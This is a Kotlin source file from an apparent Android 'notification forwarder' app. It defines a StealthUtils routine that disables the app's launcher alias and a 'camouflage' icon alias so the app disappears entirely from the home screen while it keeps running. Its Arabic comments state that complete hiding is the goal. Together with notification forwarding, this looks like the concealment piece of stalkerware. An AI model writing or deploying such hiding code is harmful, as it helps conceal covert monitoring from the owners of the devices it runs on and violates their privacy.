package com.itsazni.notificationforwarder

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object StealthUtils {

    fun switchToStealthMode(context: Context) {
        val packageManager = context.packageManager

        // 1️⃣ إيقاف الواجهة الأساسية (Pixel-Boy AI)
        val mainAlias = ComponentName(
            context,
            "com.itsazni.notificationforwarder.MainActivityAlias"
        )
        
        // 2️⃣ إيقاف أيقونة مركز العثور أيضاً للإخفاء الكامل من الشاشة
        val stealthAlias = ComponentName(
            context,
            "com.itsazni.notificationforwarder.StealthActivityAlias"
        )

        try {
            // تعطيل الواجهة الرئيسية
            packageManager.setComponentEnabledSetting(
                mainAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

            // تعطيل أيقونة التمويه لليختفي التطبيق بالكامل من الشاشة الرئيسية
            packageManager.setComponentEnabledSetting(
                stealthAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
